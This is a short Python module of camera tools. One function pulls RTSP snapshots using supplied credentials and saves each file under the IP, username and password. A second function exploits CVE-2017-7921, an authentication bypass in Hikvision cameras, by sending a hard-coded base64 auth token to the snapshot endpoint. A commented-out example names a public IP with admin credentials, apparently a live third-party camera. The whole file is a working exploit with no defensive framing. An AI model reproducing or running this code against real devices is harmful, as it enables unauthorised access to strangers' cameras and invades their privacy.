"""Some tools about camera"""
import os
import rtsp
import requests
from PIL import Image


def snapshot_rtsp(ip, user, passwd, sv_path):
    """get snapshot through rtsp"""
    with rtsp.Client(rtsp_server_uri=f"rtsp://{user}:{passwd}@{ip}:554", verbose=False) as client:
        while client.isOpened():
            img = client.read(raw=True)
            if not img is None:
                name = f"{ip}-{user}-{passwd}.jpg"
                img = Image.fromarray(img)
                img.save(os.path.join(sv_path, name))
                break


def snapshot_cve_2017_7921(ip, sv_path):
    r = requests.get(f"http://{ip}/onvif-http/snapshot?auth=YWRtaW46MTEK")
    if r.status_code == 200:
        name = f"{ip}-cve_2017_7921.jpg"
        with open(os.path.join(sv_path, name), 'wb') as f:
            f.write(r.content)


if __name__ == '__main__':
    # snapshot_rtsp('112.185.202.72', 'admin', 'a1234567', './')
    snapshot_cve_2017_7921('172.17.2.250', '.')